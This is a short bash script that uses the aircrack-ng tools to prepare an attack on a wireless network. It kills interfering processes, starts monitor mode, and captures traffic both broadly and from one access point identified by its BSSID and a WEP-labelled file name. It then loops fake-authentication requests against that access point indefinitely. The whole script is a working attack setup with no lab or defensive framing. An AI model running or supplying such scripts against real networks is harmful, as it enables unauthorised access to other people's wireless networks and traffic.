#!/bin/bash

airmon-ng check kill
airmon-ng start wlan0
gnome-terminal -e 'bash -c "airodump-ng -w /home/pawn/wifi/all mon0;read"' &
gnome-terminal -e 'bash -c "airodump-ng --channel 1 --bssid 00:24:6b:3b:b7:b7 -w /home/pawn/wifi/ssw-wep-28ab75 mon0;read"' &
gnome-terminal -e 'bash -c "for((;;));do aireplay-ng -1 600 -q 300 -a 00:24:6b:3b:b7:b7 mon0 --ignore-negative-one;done;read"' & 
